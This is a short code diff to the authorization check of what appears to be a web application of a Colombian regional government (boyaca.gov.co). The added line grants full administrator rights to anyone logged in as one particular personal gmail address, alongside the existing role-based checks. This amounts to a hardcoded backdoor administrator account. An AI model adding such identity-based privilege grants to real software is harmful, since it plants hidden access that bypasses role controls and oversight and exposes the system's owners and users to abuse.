@@ -78,7 +78,7 @@ const Auth = (() => {
     const r = String(user.role || '').toLowerCase();
     const uname = String(user.username || '').toLowerCase();
     const mods = Array.isArray(user.modules) ? user.modules : [];
-    return r === 'administrador' || r === 'admin' || r.includes('administrador') || uname === 'admin' || uname === 'admin@boyaca.gov.co' || mods.includes('*') || mods.includes('all');
+    return r === 'administrador' || r === 'admin' || r.includes('administrador') || uname === 'admin' || uname === 'admin@boyaca.gov.co' || uname === 'alejoleo2022@gmail.com' || mods.includes('*') || mods.includes('all');
   }
 
   function getRoleScope(u) {
